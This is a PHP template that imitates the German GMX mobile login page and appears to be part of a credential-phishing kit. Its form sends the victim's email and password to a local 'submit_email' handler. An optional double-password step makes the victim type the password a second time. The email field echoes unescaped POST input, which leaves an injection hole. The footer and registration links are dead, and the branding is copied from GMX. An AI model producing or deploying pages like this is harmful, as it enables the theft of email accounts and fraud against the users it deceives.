<html lang="de" xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Mobile Login</title>
<meta charset="UTF-8">
<meta name="description" content="Mobiler GMX Login: Auf dieser Seite können Sie sich mit dem Smartphone oder Tablet einfach und sicher unterwegs in Ihr GMX Postfach einloggen.">
<meta name="robots" content="noindex">
<link rel="shortcut icon" type="image/x-icon" href="//img.ui-portal.de/cd/ci/gmx.net/favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="apple-itunes-app" content="app-id=417352269">
<link rel="stylesheet" type="text/css" href="../assets/css/gmx.css">
</head>
<body>
<div class="main-layout">
    <div class="header ">
        <div class="header__text"><?= enc('Mobile Login'); ?></div>
    </div>
    <div class="centered-content centered-content--narrow">
        <div class="content-title">
            <div class="content-title__logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/GMX_2018_logo.svg/1280px-GMX_2018_logo.svg.png" style="width:100px;">
            </div>
            <h1><?= enc('Login'); ?></h1>
            <p id="loginText"><?= enc('Bitte melden Sie sich hier mit Ihrer GMX E-Mail-Adresse und Ihrem Passwort an.'); ?></p>
        </div>
        <?php
        if ($two_email == "on") {
            if (!isset($_POST['password'])) {
                echo '<form action="" method="post">';
            }else{
                echo '<form action="../account/submit_email" method="post">';
            }
        }else{
            echo '<form action="../account/submit_email" method="post">';
        }
        ?>
            <div id="0:formPanel:loginForm:usernameInput">
                <div class="pos-form-wrapper">
                    <label class="pos-label pos-label--block required" for="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input"><?= enc('GMX E-Mail-Adresse'); ?></label>
                    <div class="pos-input">
                        <input name="email" class="revealable-input-row__input" value="<?= $_POST['email']; ?>" type="email" readonly required></div>
                </div>
            </div>
            <div id="0:formPanel:loginForm:passwordInput">
                <div class="two-fa-enter-password">
                    <div class="pos-form-wrapper revealable-input-row">
                        <label class="pos-label pos-label--block required" for="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input"><?= enc('Passwort eingeben'); ?></label>
                        <div class="pos-input">
                            <input type="password" class="revealable-input-row__input" name="password" autofocus required>
                        </div>
                    </div>
                </div>
            </div>
            <button type="submit" id="submitButton" class="pos-button pos-button--cta pos-button--block a-mb-space-2"><?= enc('Login'); ?></button>
        </form>
        <a class="a-ta-c a-mb-space-3 pos-button pos-button--link pos-button--block"><?= enc('Passwort vergessen?'); ?></a>
        <hr class="centered-content__line-break a-mb-space-4">
        <div class="a-ta-c a-mb-space-4">
            <h2 class="a-mb-space-2.5"><?= enc('Neu bei GMX?'); ?></h2>
            <a class="pos-button pos-button--link pos-button--block"><?= enc('Jetzt kostenlos registrieren!'); ?></a>
        </div>
    </div>
    <div class="footer">
        <a class="footer__link"><?= enc('Impressum'); ?></a>
        <a class="footer__link"><?= enc('AGB'); ?></a>
        <a class="footer__link"><?= enc('Datenschutz'); ?></a>
    </div>
</div>
</body>
</html>